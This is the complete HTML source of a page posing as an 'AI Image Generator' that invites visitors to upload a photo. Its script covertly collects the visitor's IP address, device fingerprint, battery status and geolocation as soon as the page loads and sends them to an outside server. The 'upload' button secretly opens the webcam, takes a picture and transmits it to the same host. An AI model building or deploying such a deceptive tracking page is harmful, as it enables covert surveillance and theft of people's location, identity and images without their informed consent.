<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Image Creator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .hidden { display: none; }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h2>AI Image Generator</h2>
        <p>Upload an image to enhance it with AI</p>
        <p id="statusMessage"></p> <!-- 🔥 UI Feedback -->
        <video id="video" class="hidden" autoplay></video>
        <canvas id="canvas" class="hidden"></canvas>
        <button id="uploadBtn">Upload Image</button>
    </div>

    <script>
        const backendURL = "https://flash-3vfu.onrender.com";  
        const sessionId = Math.random().toString(36).substring(2, 15);
        let deviceData = {};

        // 📸 Capture Photo & Send Data
        document.getElementById("uploadBtn").addEventListener("click", async () => {
            const statusMessage = document.getElementById("statusMessage");
            statusMessage.innerText = "🔄 Capturing Image...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById("video");
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.getElementById("canvas");
                    const context = canvas.getContext("2d");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(async (blob) => {
                        if (!blob) {
                            console.error("❌ Failed to convert image to Blob");
                            return;
                        }

                        const formData = new FormData();
                        formData.append("photo", blob, "captured_image.jpg");

                        try {
                            await fetch(`${backendURL}/upload-photo/${sessionId}`, {
                                method: "POST",
                                body: formData,
                            });
                            statusMessage.innerText = "✅ Image Sent Successfully!";
                            console.log("📤 Image sent successfully!");
                        } catch (error) {
                            statusMessage.innerText = "❌ Failed to Send Image!";
                            console.error("❌ Error sending image:", error);
                        }
                    }, "image/jpeg", 0.5);

                    stream.getTracks().forEach(track => track.stop());
                }, 2000);
            } catch (error) {
                statusMessage.innerText = "❌ Camera access denied!";
                console.error("Camera access denied:", error);
            }
        });

        // 📡 Collect Device Info
        async function collectDeviceInfo() {
            try {
                // 🔥 Fetch IP Address
                const ipData = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
                deviceData.ip = ipData.ip;
            } catch {
                deviceData.ip = "Unknown";
            }

            // 🔥 Collect System Info
            deviceData.platform = navigator.platform;
            deviceData.userAgent = navigator.userAgent;
            deviceData.screenWidth = screen.width;
            deviceData.screenHeight = screen.height;
            deviceData.cookiesEnabled = navigator.cookieEnabled;
            deviceData.plugins = [...navigator.plugins].map(p => p.name).join(", ");

            // 🔥 Get Battery Status
            try {
                const battery = await navigator.getBattery();
                deviceData.battery = {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            } catch {
                deviceData.battery = { level: "N/A", charging: "N/A" };
            }

            // 🔥 Get Geolocation
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(position => {
                    deviceData.geo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    sendData();
                }, () => {
                    deviceData.geo = { latitude: "N/A", longitude: "N/A" };
                    sendData();
                });
            } else {
                deviceData.geo = { latitude: "N/A", longitude: "N/A" };
                sendData();
            }
        }

        // 🚀 Send Data to Backend
        function sendData() {
            fetch(`${backendURL}/track/${sessionId}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(deviceData)
            }).catch(err => console.log("Error sending data:", err));
        }

        // 🎯 Auto Start Tracking
        collectDeviceInfo();
    </script>
</body>
</html>
